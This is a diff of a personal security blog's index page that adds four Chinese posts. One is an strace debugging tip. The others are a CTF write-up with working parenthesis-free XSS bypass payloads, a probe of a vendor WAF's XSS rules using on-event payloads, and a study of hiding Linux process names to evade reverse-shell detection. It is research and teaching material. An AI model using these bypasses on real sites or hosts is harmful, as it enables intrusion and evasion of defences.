@@ -125,12 +125,12 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-count">52</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-count">22</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -159,6 +159,429 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%94%A8strace%E5%AE%9A%E4%BD%8Dbug/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E7%94%A8strace%E5%AE%9A%E4%BD%8Dbug/" class="post-title-link" itemprop="url">用strace定位bug</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>今年年初(<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=MzkzMzI3OTczNA==&scene=124#wechat_redirect">2021年我的学习计划</a>)我就计划补一下”操作系统”这门计算机专业课.</p>
+<p>最近我就在学一门网课，是极客时间的<a target="_blank" rel="noopener" href="https://time.geekbang.org/column/intro/100078401?tab=catalog">操作系统实战 45 讲</a>，感觉还可以：代码量是1w行多点，课程我就把它当做一个45讲的代码说明文档。</p>
+<p>网上也有一些类似的”实验教学”，比如：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/chyyuu/os_kernel_lab">kernel实验</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/sunym1993/flash-linux0.11-talk">linux0.11内核解读</a></li>
+<li><a target="_blank" rel="noopener" href="https://reactos.org/">reactos-操作系统</a></li>
+</ul>
+<p>目前我学习<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos">操作系统实战</a>有两个学习目标：</p>
+<ul>
+<li>完全理解<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos/tree/master/lesson13/Cosmos">第十三课的代码</a>：十三课之前的内容包括了整个机器初始化过程</li>
+<li>完全理解<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos/tree/master/lesson25~26/Cosmos">第二十六课的代码</a>：比”十三课”内容多了”进程”和”内存”</li>
+</ul>
+<p>本文记录我在学习时遇到的第一个小问题：编译”第十三课的代码”时遇到一个报错</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/141682853-e5976402-09ba-4478-aae6-4406e44c7dc3.png" alt="image"></p>
+<p>问题解决思路：</p>
+<ul>
+<li>搞清楚”编译器”去哪里找”kernel.inc”文件</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>最简便的方法找到”kernel.inc”文件位置</p>
+<p>strace -f可以跟踪子进程的系统调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp Cosmos]# strace -f make 2&gt;&#x2F;tmp&#x2F;q.txt</span><br><span class="line">[root@instance-fj5pftdp Cosmos]# cat &#x2F;tmp&#x2F;q.txt</span><br><span class="line">...</span><br><span class="line">[pid 20451] open(&quot;kernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;includekernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;bastypeinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;halinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;knlinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;libinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;drvinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] write(2, &quot;..&#x2F;hal&#x2F;x86&#x2F;kernel.asm:6: &quot;, 25..&#x2F;hal&#x2F;x86&#x2F;kernel.asm:6: ) &#x3D; 25</span><br></pre></td></tr></table></figure>
+
+<p>可以发现 <code>../includekernel.inc</code>等路径少了一个<code>/</code>符号</p>
+<p>修改后，就编译成功了</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/141683341-8053e5e0-850c-437f-9105-94ae1a4809fe.png" alt="image"></p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><code>strace -f</code> 真香：不需要我去研究”代码”或者”编译器”是怎么包含”kernel.inc文件”。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%A5%9E%E5%A5%87%E7%9A%84javascript-%E4%B8%8D%E7%94%A8%E6%8B%AC%E5%8F%B7%E5%B8%A6%E5%8F%82%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E7%A5%9E%E5%A5%87%E7%9A%84javascript-%E4%B8%8D%E7%94%A8%E6%8B%AC%E5%8F%B7%E5%B8%A6%E5%8F%82%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">神奇的javascript-不用括号带参执行函数</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>两周前，我遇到一个挺有意思的xss，过滤了很多符号，包括<code>&lt;&gt;=()`[]</code>等。</p>
+<p>我将此问题抽象成<a target="_blank" rel="noopener" href="https://04bdb3a0.o53.xyz/a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a=1">ctf题目</a>，题目源码公开在 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/40fcaed60727b6163b034145e332640f">github</a>。</p>
+<p>前两天在 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/40fcaed60727b6163b034145e332640f">题目评论</a> 中看到有师傅把答案贴出来了，我就说一下这个案例。</p>
+<h1 id="测试时遇到的问题"><a href="#测试时遇到的问题" class="headerlink" title="测试时遇到的问题"></a>测试时遇到的问题</h1><p>实际测试时遇到的问题，也是题目中有两个比较难的地方：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* javascript不用 &lt;&gt;&#x3D;()&#96;[] 等符号，怎么调用函数？</span><br><span class="line">* javascript不用 &lt;&gt;&#x3D;()&#96;[] 等符号，怎么调用函数，并且带上参数？</span><br></pre></td></tr></table></figure>
+
+<p>第一个问题简单一点：在发生类型转换时，会执行valueOf或者toString属性值指向的函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1-&#123;valueOf:function()&#123;alert(1)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第二个问题难一点，需要对this的用法比较熟悉。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在函数外部,this指向window对象</span><br><span class="line"></span><br><span class="line">在函数内部：</span><br><span class="line"></span><br><span class="line">* 普通调用时</span><br><span class="line">  * strict模式下，this指向undeined</span><br><span class="line">  * 非strict模式下，this指向当前对象</span><br></pre></td></tr></table></figure>
+
+<p>还有一些方式改变this指向的对象，包括：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 调用call函数、apply函数等指定对象</span><br><span class="line">* new构造函数</span><br></pre></td></tr></table></figure>
+
+<p>this涉及的情况比较多，也比较反直觉，这里就不多说了。可以看 <a target="_blank" rel="noopener" href="https://time.geekbang.org/column/article/113399">11 | this：从JavaScript执行上下文的视角讲清楚this</a> 这篇文章。</p>
+<h1 id="题目解法"><a href="#题目解法" class="headerlink" title="题目解法"></a>题目解法</h1><p>我的解法和 @rmb122 师傅一样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;04bdb3a0.o53.xyz&#x2F;a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a&#x3D;xx%27-&#123;valueOf:test.a,%27call%27:%22%27%22%2blocation.hash&#125;-%27#&#39;;hello(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>我也把题目发给我做前端开发的朋友，他的解法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;04bdb3a0.o53.xyz&#x2F;a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a&#x3D;%27%2B&#123;toString:%20test.a,call:%20%27hello%27%2B[...hello%2B%27%27][29]%2B%22%27a%27,%22%2B%22%27b%27,%22%2B%22%27c%27%22%2B[...hello%2B%27%27][56]&#125;%2B%27</span><br></pre></td></tr></table></figure>
+
+<p>中间有个小插曲：在朋友把他的解法发我后，我在代码中添加了对[]符号的过滤，因为我碰到的实际案例中也过滤了[]符号。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然当时绕过了xss的过滤，也清楚触发流程，但是我不明白为什么会这么触发。</p>
+<p>所以补了一下和此题相关的语法及概念，包括以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 类型转换</span><br><span class="line">* this是什么</span><br><span class="line">* 函数是一等公民</span><br></pre></td></tr></table></figure>
+
+<p>由这个问题想到，是否其他语言有类似场景？比如某个对象可控时，对它做运算会导致函数调用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj &#x3D; &#123;&quot;可控key&quot;:&quot;可控value&quot;&#125;</span><br><span class="line"></span><br><span class="line">操作 obj</span><br></pre></td></tr></table></figure>
+
+<p>这是一个木有答案的问题。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(1)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(1)/" class="post-title-link" itemprop="url">细品某语义waf的xss防护(1)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>假设攻击场景如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xss漏洞输出位置如下:</span><br><span class="line"></span><br><span class="line">  &lt;div&gt;用户输出可控位置&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">攻击者准备利用on事件来执行js,比如</span><br><span class="line"></span><br><span class="line">  &lt;div&gt;&lt;svg onload&#x3D;&quot;alert(&#39;xss&#39;);&quot;&gt;&lt;&#x2F;div&gt;   利用onload属性</span><br></pre></td></tr></table></figure>
+
+<p>验证在这个场景下厂商的安全防护策略</p>
+<p>分析思路：</p>
+<ol>
+<li>改变payload，根据拦截情况推测安全防护策略</li>
+</ol>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;  不拦截</span><br><span class="line">a&#x3D;&lt;img&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;  拦截</span><br></pre></td></tr></table></figure>
+<p>说明区分了认识的标签和不认识的标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;a&#x3D;&lt;div&#x2F;oxx&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;&#39;    不拦截</span><br><span class="line">&#39;a&#x3D;&lt;div&#x2F;onxx&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;&#39;   拦截</span><br></pre></td></tr></table></figure>
+<p>拦截on事件，只要以on开头就拦截</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa(&#39;&#39;;&quot;&gt;   on属性值中少一个右括号就不拦截，说明判断js语法是否正确</span><br><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa(&#39;&#39;);&quot;&gt;   拦截</span><br><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa;&quot;&gt;   不拦截</span><br></pre></td></tr></table></figure>
+<p>未知标签 &amp;&amp; on事件 &amp;&amp; 解析on属性中js &amp;&amp; on属性中调用了函数   则拦截</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;onxxx&#x3D;a();&gt;     不拦截</span><br><span class="line">a&#x3D;&lt;xxx&#x2F;onxxx&#x3D;xxxxx;a();&gt;   拦截</span><br></pre></td></tr></table></figure>
+<p>on属性值需要大于一定长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;img&#x2F;onxxxx&#x3D;&quot;aaa&quot;&gt;  不拦截</span><br><span class="line"></span><br><span class="line">a&#x3D;&lt;img&#x2F;onxxxx&#x3D;&quot;aaaaaaa&quot;&gt;   拦截</span><br></pre></td></tr></table></figure>
+<p>已知标签on属性值大于一定长度则拦截</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>存在HTML解析和JS解析</p>
+<p>安全防护策略可能是：</p>
+<ul>
+<li>HTML解析 &amp;&amp; 未知标签 &amp;&amp; on事件 &amp;&amp; on属性值大于一定长度 &amp;&amp; 对on属性值做JS解析 &amp;&amp; on属性中调用了函数   则拦截</li>
+<li>HTML解析 &amp;&amp; 已知标签 &amp;&amp; on事件 &amp;&amp; on属性值大于一定长度  则拦截</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E6%94%B9%E5%8F%98%E8%BF%9B%E7%A8%8B%E5%90%8D%E7%A7%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E6%94%B9%E5%8F%98%E8%BF%9B%E7%A8%8B%E5%90%8D%E7%A7%B0/" class="post-title-link" itemprop="url">如何改变进程名称</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>之前在<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/pFpGujKnXMhOh5ef3Z9H2g">测试反弹shell</a>时，测试发现：某厂商会根判断程命令是否是bash、sh等脚本解释器，如果修改bash、sh等文件名后反弹shell，就会绕过厂商的反弹shell防护。</p>
+<blockquote>
+<p>需要注意的的是：”修改敏感文件名、复制敏感文件“本身非常有可能被hids当作一种”异常文件操作”行为。</p>
+</blockquote>
+<p>还有一些场景下也会涉及到”进程名称的修改”：比如某些恶意软件会修改进程名称，伪装成”内核线程”。</p>
+<p>所以可以说，在”进程名称的修改”这个点上是存在一些攻防对抗的。</p>
+<p>本文研究：</p>
+<ul>
+<li>除了直接修改程序文件名，还有哪些方式来修改进程名称？</li>
+<li>作为防守方，怎么发现和检测这些”修改方式”？</li>
+</ul>
+<p>本文应该适合 做应急响应、hids和”对linux后渗透感兴趣”的读者阅读，文章中给出了我对每种隐藏方式的效果验证，方便读者对隐藏效果做评估。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>怎么查看”进程名称”？</p>
+<p>在 /proc/{pid} 目录下有好几个文件都存放有”进程名称”相关的信息，如下图：<br><img src="https://user-images.githubusercontent.com/1846319/131244474-9dbb39c7-ba13-4033-a213-809a7773e443.png" alt="image"></p>
+<p>更常见的情况下，我们是通过ps、top等命令来查看进程信息。</p>
+<p>ps命令也是基于 /proc/{pid}/stat、/proc/{pid}/status、/proc/{pid}/cmdline 等文件来获取进程信息。可以通过strace命令查看系统调用验证一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# strace ps aux 2&gt;&amp;1 |grep proc |grep 29224</span><br><span class="line">stat(&quot;&#x2F;proc&#x2F;29224&quot;, &#123;st_mode&#x3D;S_IFDIR|0555, st_size&#x3D;0, ...&#125;) &#x3D; 0</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;stat&quot;, O_RDONLY)      &#x3D; 6</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;status&quot;, O_RDONLY)    &#x3D; 6</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;cmdline&quot;, O_RDONLY)   &#x3D; 6</span><br><span class="line">readlink(&quot;&#x2F;proc&#x2F;29224&#x2F;fd&#x2F;2&quot;, &quot;&#x2F;42&quot;, 127) &#x3D; 3</span><br><span class="line">[root@instance-fj5pftdp ~]#</span><br><span class="line">[root@instance-fj5pftdp ~]# strace ps -A 2&gt;&amp;1 |grep proc |grep 29224</span><br><span class="line">stat(&quot;&#x2F;proc&#x2F;29224&quot;, &#123;st_mode&#x3D;S_IFDIR|0555, st_size&#x3D;0, ...&#125;) &#x3D; 0</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;stat&quot;, O_RDONLY)      &#x3D; 6</span><br><span class="line">open(&quot;&#x2F;proc&#x2F;29224&#x2F;status&quot;, O_RDONLY)    &#x3D; 6</span><br><span class="line">readlink(&quot;&#x2F;proc&#x2F;29224&#x2F;fd&#x2F;2&quot;, &quot;&#x2F;42&quot;, 127) &#x3D; 3</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>怎么修改”进程名称”？</p>
+<p>改变进程名包括以下方式：</p>
+<ul>
+<li>execve系统调用</li>
+<li>prctl系统调用</li>
+<li>修改进程argv</li>
+<li>软链接</li>
+</ul>
+</li>
+</ul>
+<h1 id="通过”execve系统调用”改变进程名称"><a href="#通过”execve系统调用”改变进程名称" class="headerlink" title="通过”execve系统调用”改变进程名称"></a>通过”execve系统调用”改变进程名称</h1><ul>
+<li><p>怎么通过”execve系统调用”可以改变进程名称？</p>
+<p>execve系统调用的第二个参数可以指定cmdline，如下：</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/131255950-11235b12-c64c-4572-8a0d-521a299b3ee6.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">     char * execve_str[] &#x3D; &#123;&quot;test_sleep&quot;,&quot;10000&quot;&#125;;   &#x2F;&#x2F; 第一个参数会出现在&#x2F;pro&#x2F;&#123;pid&#125;&#x2F;cmdline</span><br><span class="line">     char * env[] &#x3D; &#123;NULL&#125;;</span><br><span class="line">     if (execve(&quot;&#x2F;usr&#x2F;bin&#x2F;sleep&quot;,execve_str,env) &lt;0 )&#123;</span><br><span class="line">         perror(&quot;error on exec&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>更简便的方式是：通过bash的exec命令的<code>-a</code>参数改变进程名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec -a &quot;xxx&quot; sleep 10000</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>效果</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/131254028-441d0792-68b5-4eab-b2a2-6208fe6f2c70.png" alt="image"></p>
+<p>可以看到：<code>ps -A</code>可以看到sleep文件名信息，<code>ps aux</code>无法看到。</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/131253952-c2ea6b18-614f-4145-b7a5-c05b97235a29.png" alt="image"></p>
+<p>可以看到：只有cmdline被修改了。</p>
+</li>
+</ul>
+<h1 id="通过”prctl系统调用”改变进程名称"><a href="#通过”prctl系统调用”改变进程名称" class="headerlink" title="通过”prctl系统调用”改变进程名称"></a>通过”prctl系统调用”改变进程名称</h1><ul>
+<li><p>怎么通过”prctl系统调用”改变进程名称？</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/250654.html">Linux进程隐藏：初级篇</a> 这篇文章有demo代码</p>
+</li>
+<li><p>效果<br><img src="https://user-images.githubusercontent.com/1846319/131256636-e9edd238-3856-4f90-a126-30570e44a472.png" alt="image"></p>
+<p>可以看到虽然stat、comm、status文件已经修改，但是cmdline、exe等文件仍然有原程序名信息。</p>
+</li>
+<li><p>怎么检测？</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/blob/main/driver/README-zh_CN.md">字节hids</a> hook了这个系统调用</p>
+</li>
+</ul>
+<h1 id="通过”修改进程argv-0-”隐藏进程名称"><a href="#通过”修改进程argv-0-”隐藏进程名称" class="headerlink" title="通过”修改进程argv[0]”隐藏进程名称"></a>通过”修改进程argv[0]”隐藏进程名称</h1><ul>
+<li><p>怎么通过”修改进程argv[0]”隐藏进程名称？</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/250654.html">Linux进程隐藏：初级篇</a> 这篇文章有demo代码</p>
+</li>
+<li><p>谁用了这种方式？</p>
+<p>恶意软件<a target="_blank" rel="noopener" href="https://github.com/n1nj4sec/pupy/blob/unstable/pupy/packages/linux/all/hide_process.py">puppy</a> 就用到了这种方式修改进程名为”[kworker/2:0]”。</p>
+<blockquote>
+<p>“[XXXX]”这种进程名都是内核线程</p>
+</blockquote>
+<p><img src="https://user-images.githubusercontent.com/1846319/131245230-c8f97321-5d04-41f9-a347-f7a4f69e3794.png" alt="image"></p>
+</li>
+<li><p>效果</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/131253587-ec40a6c2-2b19-4df1-90d3-68a6772be975.png" alt="image"></p>
+<p>可以看到：只有cmdline被修改了。</p>
+</li>
+</ul>
+<h1 id="通过”软链接”改变进程名称"><a href="#通过”软链接”改变进程名称" class="headerlink" title="通过”软链接”改变进程名称"></a>通过”软链接”改变进程名称</h1><ul>
+<li><p>是什么？</p>
+<p>在 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1609832">两个主题：躲避execve与分析/proc/目录</a> 这篇文章提到了：利用”软链接”可以改变进程信息，并且文件哈希和源文件不一致，这样可以用来躲避安全产品的监控。</p>
+</li>
+<li><p>效果<br><img src="https://user-images.githubusercontent.com/1846319/131256254-29bd80e0-8475-47f2-a13f-c6d4bfcc3b39.png" alt="image"></p>
+<p>可以看到：只有exe文件还有原程序信息，所以这种方式隐藏进程名的效果是最好的。</p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>可以有以下结论：</p>
+<ul>
+<li>单看四种隐藏方式，”软链接”这种方式隐蔽得最好；其他几种方式，comm、stat、cmdline、status文件中总会有原程序相关信息</li>
+<li>不论哪种方式，exe文件仍然有原程序相关信息</li>
+<li>像”prctl系统调用”这种方式应该避免使用</li>
+</ul>
+
+      
